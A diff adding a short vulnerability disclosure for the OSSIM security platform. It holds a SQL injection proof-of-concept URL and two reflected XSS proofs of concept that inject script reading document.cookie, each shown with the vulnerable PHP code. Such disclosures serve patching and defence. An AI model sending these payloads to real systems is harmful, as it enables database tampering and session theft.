@@ -1,0 +1,49 @@
+
+#### SQL-Injection 01 ####
+
+https://www.example.com/ossim/forensics/base_qry_main.php?clear_allcriteria=1&num_result_rows=-1&submit=Query+DB&current_view=-1&sort_order=time_d&time[0][0]=1=1) LIMIT 1--+&time[0][1]=%3E=&time[0][2]=04&time[0][3]=24&time[0][4]=2012&time[0][5]=3&time[0][6]=3&time[0][7]=3&time[0][8]=+&time[0][9]=+&time_range=today&hmenu=Forensics&smenu=Forensics
+
+#### 01 - XSS ####
+
+
+----- vuln code -----
+
+The 'url' parameter on the top.php page is vulnerable to XSS.  
+Authentication is needed.
+
+if ($url != "")
+{
+        $url_check = preg_replace("/\.php.*/",".php",$url);
+        if (!file_exists($url_check))
+        {
+                echo _("Can't access to $url_check for security reasons");
+                exit;
+        }
+}
+
+----- PoC -----
+
+https://www.example.com/ossim/top.php?option=3&soption=3&url='"</script><script>alert(document.cookie)</script>
+
+#### 02 - XSS ####
+
+----- vuln code -----
+
+The 'time[0][0]' parameter on the base_qry_main.php and a wrong error handling makes a XSS possible.  
+Authentication is needed.
+
+// includes/base_db.inc.php
+
+if ((!$rs || $this->baseErrorMessage() != "") && $die_on_error) {
+            echo '</TABLE></TABLE></TABLE>
+<FONT COLOR="#FF0000"><B>' . gettext("Database ERROR:") . '</B>' . $this->baseErrorMessage() . '</FONT>' . '<P><PRE>' . ($debug_mode > 0 ? ($this->lastSQL) . $limit_str : "") . '</PRE><P>';
+            die();
+        } else {
+            return $rs;
+   }
+}
+
+----- PoC -----
+
+https://www.example.com/ossim/forensics/base_qry_main.php?clear_allcriteria=1&num_result_rows=-1&submit=Query+DB&current_view=-1&sort_order=time_d&time[0][0]=<script>alert(document.cookie)</script>&time[0][1]=%3E=&time[0][2]=04&time[0][3]=24&time[0][4]=2012&time[0][5]=3&time[0][6]=3&time[0][7]=3&time[0][8]=+&time[0][9]=+&time_range=today&hmenu=Forensics&smenu=Forensics
+
